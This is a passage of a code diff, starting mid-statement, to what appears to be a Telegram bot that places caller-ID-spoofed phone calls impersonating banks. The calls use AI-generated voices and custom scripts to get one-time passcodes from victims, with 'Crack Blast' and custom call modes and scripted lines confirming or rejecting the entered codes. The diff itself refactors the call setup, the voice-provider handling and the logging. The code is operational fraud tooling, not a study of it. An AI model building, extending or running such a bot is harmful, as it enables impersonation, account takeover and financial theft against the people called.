-                    f"{public_base.rstrip('/')}/ai_start"
-                    f"?user_id={quote_plus(str(user_id_str))}"
-                    f"&chat_id={quote_plus(str(chat_id))}"
-                    f"&name={quote_plus(name)}"
-                    f"&company={quote_plus(company)}"
-                    f"&voice_id={quote_plus(voice_id)}"
-                    f"&custom_script={quote_plus(script)}"
-                    f"&code_length={quote_plus(code_length)}"
-                    f"&call_type=custom"
-                    f"&mode_label=Custom%20Call"
-                )
                 
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
                     caller_id=caller_id,
-                    webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     call_record=True,
+                    code_length=code_length,
+                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create custom call")
@@ -6396,8 +4437,8 @@ def _handle_query_processing(call, _):
         if call_mode_label:
             try:
                 (user_conf_path(user_id_str) / "call_mode_label.txt").unlink()
-            except Exception:
-                pass
+            except Exception as exc:
+                logger.warning("Failed to remove call_mode_label.txt for user %s: %s", user_id_str, exc)
         run_callback_async(initiate_normal_call, chat_id, user_id_str, call.from_user, status_message_id, mode_label=call_mode_label)
         return
 
@@ -6426,29 +4467,16 @@ def _handle_query_processing(call, _):
                 name = read_user_file(user_id_str, "Name.txt", "Customer")
                 company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                 code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
-                public_base = build_public_base_url() or NGROK_URL
-                webhook_url = (
-                    f"{public_base.rstrip('/')}/ai_start"
-                    f"?user_id={quote_plus(str(user_id_str))}"
-                    f"&chat_id={quote_plus(str(chat_id))}"
-                    f"&name={quote_plus(name)}"
-                    f"&company={quote_plus(company)}"
-                    f"&voice_id={quote_plus(voice_id)}"
-                    f"&custom_script={quote_plus(script)}"
-                    f"&code_length={quote_plus(code_length)}"
-                    f"&call_type=custom"
-                    f"&mode_label=Custom%20Call"
-                )
                 caller_id = read_user_file(user_id_str, "custom_caller_id.txt", "").strip()
                 sid = make_spoofed_call(
                     to=phonenum,
                     from_number=OUTBOUND_CALLER_ID,
                     caller_id=caller_id,
-                    webhook_url=webhook_url,
                     user_id=user_id_str,
                     chat_id=chat_id,
                     call_record=True,
-                    machine_detection=True,
+                    code_length=code_length,
+                    custom_instructions=script,
                 )
                 if not sid:
                     raise Exception("Failed to create custom call")
@@ -7007,12 +5035,15 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
     # --- Voice selection callback ---
     if call.data.startswith("voice_select_"):
         voice_id = call.data.replace("voice_select_", "")
-        name = next((v["name"] for v in VOICE_MAPPING.values() if v["id"] == voice_id), None)
+        entry = next((v for v in VOICE_MAPPING.values() if v["id"] == voice_id), None)
+        name = entry["name"] if entry else None
+        provider = entry["provider"] if entry else "elevenlabs"
         if name:
             state = get_user_state(user_id_str)
             if state == "crack_blast_step_4_voice":
                 write_user_file(user_id_str, "crack_voice_id.txt", voice_id)
                 write_user_file(user_id_str, "crack_voice_name.txt", name)
+                write_user_file(user_id_str, "crack_voice_provider.txt", provider)
                 set_user_state(user_id_str, "crack_blast_step_5_digits")
                 bot.answer_callback_query(call.id, f"Crack Blast voice selected: {name}")
                 try:
@@ -7027,6 +5058,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
             if state == "manual_call_step_4_voice":
                 write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
                 write_user_file(user_id_str, "manual_voice_name.txt", name)
+                write_user_file(user_id_str, "manual_voice_provider.txt", provider)
                 set_user_state(user_id_str, "manual_call_step_5_digits")
                 bot.answer_callback_query(call.id, f"Manual call voice selected: {name}")
                 try:
@@ -7041,6 +5073,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
             if state == "custom_call_step_5_voice":
                 write_user_file(user_id_str, "custom_voice_id.txt", voice_id)
                 write_user_file(user_id_str, "custom_voice_name.txt", name)
+                write_user_file(user_id_str, "custom_voice_provider.txt", provider)
                 set_user_state(user_id_str, "custom_call_step_6_digits")
                 bot.answer_callback_query(call.id, f"Custom call voice selected: {name}")
                 try:
@@ -7053,20 +5086,19 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                 return
 
             if state == "normal_call_step_9_voice":
-                # Accept the voice selection and hand off to the compatibility preview/confirm UI
                 try:
                     write_user_file(user_id_str, "Voice.txt", voice_id)
                     write_user_file(user_id_str, "VoiceName.txt", name)
+                    write_user_file(user_id_str, "VoiceProvider.txt", provider)
                     bot.answer_callback_query(call.id, f"Voice selected: {name}")
                     import handlers.call_flow as cf
                     cf.init_bot(bot)
-                    # Show the preview/confirm panel implemented in the compatibility layer
                     cf.show_preview_and_confirm_compat(chat_id, user_id_str)
                 except Exception:
-                    # Fallback to legacy reply_markup update
                     try:
                         write_user_file(user_id_str, "Voice.txt", voice_id)
                         write_user_file(user_id_str, "VoiceName.txt", name)
+                        write_user_file(user_id_str, "VoiceProvider.txt", provider)
                         bot.answer_callback_query(call.id, f"Voice selected: {name}")
                         from menu_utils import build_voice_selection_keyboard
                         keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
@@ -7077,6 +5109,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
 
             write_user_file(user_id_str, "Voice.txt", voice_id)
             write_user_file(user_id_str, "VoiceName.txt", name)
+            write_user_file(user_id_str, "VoiceProvider.txt", provider)
             bot.answer_callback_query(call.id, f"Voice selected: {name}")
             try:
                 from menu_utils import build_voice_selection_keyboard
@@ -7118,7 +5151,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
             if client:
                 resp = VoiceResponse()
                 say_done = "We have successfully verified your account. No further action is needed at this time. We apologize for any inconvenience and thank you for being a loyal customer. Goodbye."
-                audio_done = generate_call_audio(user_id=target_user_id, text=say_done, voice_id=voice_id_accept, filename="otp_accepted.mp3")
+                audio_done = None
                 if audio_done:
                     resp.play(audio_done)
                 else:
@@ -7149,7 +5182,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                 resp = VoiceResponse()
                 if attempts >= 3:
                     say_fail = "Too many failed attempts. Your account is locked. Please contact support."
-                    audio_fail = generate_call_audio(user_id=target_user_id, text=say_fail, voice_id=voice_id_decline, filename="otp_locked.mp3")
+                    audio_fail = None
                     if audio_fail:
                         resp.play(audio_fail)
                     else:
@@ -7157,7 +5190,7 @@ Success rate: {round((successful/len(users)*100), 1)}%"""
                     resp.hangup()
                 else:
                     say_try = "The code was incorrect. Please try again."
-                    audio_try = generate_call_audio(user_id=target_user_id, text=say_try, voice_id=voice_id_decline, filename="otp_retry.mp3")
+                    audio_try = None
                     if audio_try:
                         resp.play(audio_try)
                     else:
@@ -7537,7 +5570,7 @@ def handle_stateful_text(message):
                 return
             manual_params = {
                 "script": read_user_file(user_id_str, "manual_script.txt", ""),
-                "voice_id": read_user_file(user_id_str, "manual_voice_id.txt", get_default_voice_id()),
+                "voice_id": read_user_file(user_id_str, "manual_voice_id.txt", DEFAULT_VOICE_ID),
                 "caller_id": read_user_file(user_id_str, "manual_caller_id.txt", TWILIO_PHONE_NUMBER),
                 "delay": read_user_file(user_id_str, "manual_delay.txt", "0"),
                 "fallback": read_user_file(user_id_str, "manual_fallback.txt", ""),
@@ -7671,7 +5704,7 @@ def handle_stateful_text(message):
                 return
             custom_params = {
                 "script": read_user_file(user_id_str, "custom_script.txt", ""),
-                "voice_id": read_user_file(user_id_str, "custom_voice_id.txt", get_default_voice_id()),
+                "voice_id": read_user_file(user_id_str, "custom_voice_id.txt", DEFAULT_VOICE_ID),
                 "caller_id": read_user_file(user_id_str, "custom_caller_id.txt", TWILIO_PHONE_NUMBER),
                 "delay": read_user_file(user_id_str, "custom_delay.txt", "0"),
                 "fallback": read_user_file(user_id_str, "custom_fallback.txt", ""),
@@ -9124,7 +7157,6 @@ if __name__ == "__main__":
     logger.info(f"Telegram Polling:      {'ACTIVE' if runtime_mode == 'full' else 'DISABLED'}")
     logger.info(f"Webhook Mode:          {USE_WEBHOOK}")
     logger.info(f"Twilio Configured:     {'YES' if twilio_client else 'NO'}")
-    logger.info(f"ElevenLabs Configured: {'YES' if ELEVENLABS_API_KEY else 'NO'}")
     logger.info("="*70 + "\n")
     
     logger.info("Main process entering keepalive loop while background services run.")
